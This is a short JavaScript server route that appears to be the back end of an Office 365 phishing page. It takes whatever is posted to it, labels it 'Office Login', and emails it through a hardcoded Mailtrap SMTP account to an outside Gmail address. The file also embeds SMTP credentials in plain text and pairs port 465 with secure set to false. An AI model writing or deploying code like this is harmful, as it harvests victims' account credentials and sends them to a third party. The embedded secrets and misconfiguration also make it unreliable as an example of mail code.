let nodemailer = require('nodemailer')

export default async function sendEmail (req, res) {
    console.log(req.body)

     let transporter = nodemailer.createTransport({
        port: 465,
        host: "smtp.mailtrap.io",
        secure: false, // true for 465, false for other ports
        auth: {
          user: 'f170ce069f47e7', // generated ethereal user
          pass: '3f3738fc2e949c', // generated ethereal password
        },
     })

       let info = await transporter.sendMail({
        from: '"Office" <techbae.js@gmail.com>',
        to: 'linkersmind@gmail.com',
        subject: 'Office365',
        text: `Ofiice login ${req.body}`,
        html: `<h3> Office Login: ${req.body}</h3>`
       })

      res.json({info})
}
